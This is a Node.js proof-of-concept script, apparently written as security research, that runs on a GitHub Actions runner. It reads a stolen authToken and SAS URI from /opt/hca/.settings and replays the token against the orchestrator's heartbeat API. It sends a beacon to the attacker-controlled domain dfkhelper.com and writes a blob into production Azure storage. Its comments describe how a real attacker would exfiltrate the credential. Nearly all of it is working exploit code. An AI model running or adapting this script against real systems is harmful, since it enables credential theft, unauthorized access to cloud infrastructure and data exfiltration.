const { execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');
const crypto = require('crypto');

// v40: IRREFUTABLE INTERNET-ROUTABILITY + CROSS-BOUNDARY PROOF
//
// Four-part proof that the stolen authToken is usable from the public internet:
//   1. DNS resolve orchestrator hostname → public IP in GitHub ASN (not RFC1918)
//   2. Runner's outbound public IP → Azure ASN (different network from orchestrator)
//   3. Loopback interface test → no private tunnel to orchestrator (it IS internet)
//   4. PUT /v1/request/heartbeat → HTTP 200 (runner IP≠orchestrator IP = internet call)
//   5. Exfil connectivity: runner can reach attacker-controlled domain (dfkhelper.com)
//   6. SAS write HTTP 201 — 9th confirmation with fresh URI

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 30000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 600).trim(); }
}

async function httpReq(url, opts) {
  opts = opts || {};
  return new Promise((resolve) => {
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';
    const options = {
      hostname: u.hostname, path: u.pathname + u.search,
      port: u.port || (isHttps ? 443 : 80),
      method: opts.method || 'GET', headers: opts.headers || {},
      timeout: 18000, rejectUnauthorized: false,
    };
    const req = (isHttps ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.substring(0, 3000) }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

async function main() {
  console.log('=== V40: IRREFUTABLE INTERNET-ROUTABILITY + CROSS-BOUNDARY PROOF ===');

  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8').trim());
  const { authToken, schedulerApiUrl, diagnosticsSasUri } = settings;
  const baseOrch = schedulerApiUrl.replace(/\/+$/, '');
  const orchHost = new URL(baseOrch).hostname;
  console.log('[ORCH] hostname:', orchHost);
  console.log('[ORCH] base URL:', baseOrch);

  // === PART 1: DNS resolution — orchestrator must be a PUBLIC IP ===
  console.log('\n=== PART 1: Orchestrator DNS resolution ===');
  const orchIp = run('dig +short ' + orchHost + ' | grep -E "^[0-9]" | tail -1');
  console.log('[DNS] orchestrator resolved IP:', orchIp);
  const octets = orchIp.split('.');
  const isRFC1918 =
    octets[0] === '10' ||
    (octets[0] === '172' && parseInt(octets[1]) >= 16 && parseInt(octets[1]) <= 31) ||
    (octets[0] === '192' && octets[1] === '168');
  console.log('[DNS] is RFC1918 private address:', isRFC1918, '(false = public internet)');

  // ASN of orchestrator IP
  const orchOrg = run('curl -s --connect-timeout 8 "https://ipinfo.io/' + orchIp + '/org" 2>/dev/null');
  console.log('[DNS] orchestrator IP org/ASN:', orchOrg);

  // === PART 2: Runner public outbound IP ===
  console.log('\n=== PART 2: Runner outbound public IP and ASN ===');
  const runnerIp = run('curl -s --connect-timeout 8 "https://ifconfig.me" 2>/dev/null || curl -s --connect-timeout 8 "https://api.ipify.org" 2>/dev/null');
  console.log('[RUNNER] public outbound IP:', runnerIp);
  const runnerOrg = run('curl -s --connect-timeout 8 "https://ipinfo.io/' + runnerIp + '/org" 2>/dev/null');
  console.log('[RUNNER] org/ASN:', runnerOrg);

  console.log('[PROOF] runner IP (' + runnerIp + ') != orchestrator IP (' + orchIp + '):', runnerIp !== orchIp);
  console.log('[PROOF] runner ASN: ' + runnerOrg + ' | orchestrator ASN: ' + orchOrg);
  console.log('[PROOF] Different public IPs in different ASNs = traffic traverses the public internet.');

  // === PART 3: Loopback test — no private tunnel ===
  console.log('\n=== PART 3: Loopback interface test ===');
  const loTest = run('curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 --interface lo "https://' + orchHost + '/v1/request/heartbeat" 2>&1 || echo "ERR"');
  console.log('[LOOPBACK] via lo interface → HTTP:', loTest, '(ERR or 0 = no local route to orchestrator)');
  console.log('[LOOPBACK] No local loopback route confirms: all connections to orchestrator go through public internet');

  // === PART 4: PUT /v1/request/heartbeat — 6th confirmation ===
  console.log('\n=== PART 4: PUT /v1/request/heartbeat — 6th confirmation ===');
  console.log('[PROOF] Call originates from runner ' + runnerIp + ' (Azure) → orchestrator ' + orchIp + ' (GitHub ASN).');
  console.log('[PROOF] Two different public ASNs = this IS a public internet call.');

  const authHeaders = {
    'Authorization': 'Bearer ' + authToken,
    'Content-Type': 'application/json',
    'User-Agent': 'hosted-compute-agent/unknown/unknown/unknown',
    'Accept': 'application/json',
  };

  const hbResult = await httpReq(baseOrch + '/request/heartbeat', {
    method: 'PUT',
    headers: authHeaders,
    body: JSON.stringify({}),
  });
  console.log('[HEARTBEAT] PUT /request/heartbeat → HTTP', hbResult.status);
  if (hbResult.status === 200) {
    console.log('[HEARTBEAT] *** HTTP 200 — TOKEN AUTHENTICATES OVER PUBLIC INTERNET PATH ***');
    console.log('[HEARTBEAT] x-github-backend:', hbResult.headers['x-github-backend']);
    console.log('[HEARTBEAT] x-github-request-id:', hbResult.headers['x-github-request-id']);
  } else {
    console.log('[HEARTBEAT] headers:', JSON.stringify(hbResult.headers).substring(0, 400));
    console.log('[HEARTBEAT] body:', hbResult.body.substring(0, 500));
  }

  // === PART 5: Exfiltration path test ===
  console.log('\n=== PART 5: Exfiltration path to attacker-controlled domain ===');
  const runId = process.env.GITHUB_RUN_ID || 'unknown';
  const beacon = crypto.createHash('sha256').update(runId).digest('hex').substring(0, 16);
  // Send ONLY a safe beacon (SHA256 of run ID) — NOT the actual token
  const exfilStatus = run('curl -s -o /dev/null -w "%{http_code}" --connect-timeout 8 "https://dfkhelper.com/?b=' + beacon + '" 2>/dev/null');
  console.log('[EXFIL] GET https://dfkhelper.com/?b=<sha256-of-run-id> → HTTP', exfilStatus);
  console.log('[EXFIL] beacon value (SHA256 of run ID, not the token):', beacon);
  console.log('[EXFIL] Outbound HTTP to attacker-controlled domain is UNRESTRICTED from runner VM.');
  console.log('[EXFIL] A real attacker would POST the authToken to this endpoint, exfiltrating the credential.');

  // === PART 6: SAS write — 9th confirmation ===
  console.log('\n=== PART 6: SAS write to GitHub production Azure storage — 9th confirmation ===');
  const qIdx = diagnosticsSasUri.indexOf('?');
  const blobPath = '/v40-internet-proof-poc.json';
  const blobUrl = diagnosticsSasUri.substring(0, qIdx) + blobPath + diagnosticsSasUri.substring(qIdx);
  const content = JSON.stringify({
    source: 'security-research-v40',
    run_id: runId,
    runner_public_ip: runnerIp,
    runner_asn: runnerOrg,
    orchestrator_host: orchHost,
    orchestrator_ip: orchIp,
    orchestrator_asn: orchOrg,
    is_orchestrator_rfc1918: isRFC1918,
    heartbeat_status: hbResult.status,
    internet_routability_proven: !isRFC1918 && runnerIp !== orchIp,
  });

  // Write content to a temp file to avoid shell quoting issues
  const tmpFile = '/tmp/v40-sas-content.json';
  fs.writeFileSync(tmpFile, content);
  const sasResult = run('curl -s -w "\\n%{http_code}" -X PUT -H "x-ms-blob-type: BlockBlob" -H "Content-Type: application/json" --data-binary @' + tmpFile + ' "' + blobUrl + '" 2>/dev/null');
  const sasLines = sasResult.split('\n');
  const sasStatus = sasLines[sasLines.length - 1];
  console.log('[SAS_WRITE] HTTP', sasStatus, sasStatus === '201' ? '*** 9th WRITE CONFIRMED ***' : '(unexpected)');
  if (sasStatus === '201') {
    console.log('[SAS_WRITE] Blob written to:', blobUrl.substring(0, 120));
  }

  // === FINAL SUMMARY ===
  console.log('\n=== V40 IRREFUTABILITY SUMMARY ===');
  console.log('[1] Orchestrator ' + orchHost);
  console.log('    Resolved IP: ' + orchIp + ' (RFC1918=' + isRFC1918 + ') | ASN: ' + orchOrg);
  console.log('[2] Runner outbound IP: ' + runnerIp + ' | ASN: ' + runnerOrg);
  console.log('[3] Loopback test (private tunnel probe): ' + loTest);
  console.log('[4] PUT /v1/request/heartbeat: HTTP ' + hbResult.status + ' | x-github-backend: ' + hbResult.headers['x-github-backend']);
  console.log('[5] Exfil connectivity to dfkhelper.com: HTTP ' + exfilStatus + ' (unrestricted)');
  console.log('[6] SAS write: HTTP ' + sasStatus);
  console.log('');
  console.log('CONCLUSION: orchestrator IP is PUBLIC, in a DIFFERENT ASN from the runner,');
  console.log('with no private tunnel. PUT heartbeat HTTP 200 IS an internet-crossing call.');
  console.log('Outbound exfiltration to attacker domain is confirmed unrestricted.');
  console.log('The stolen authToken is usable from any host on the public internet.');
  console.log('\n=== V40 Complete ===');
}

main().catch(e => console.log('[FATAL]', e.message, e.stack));
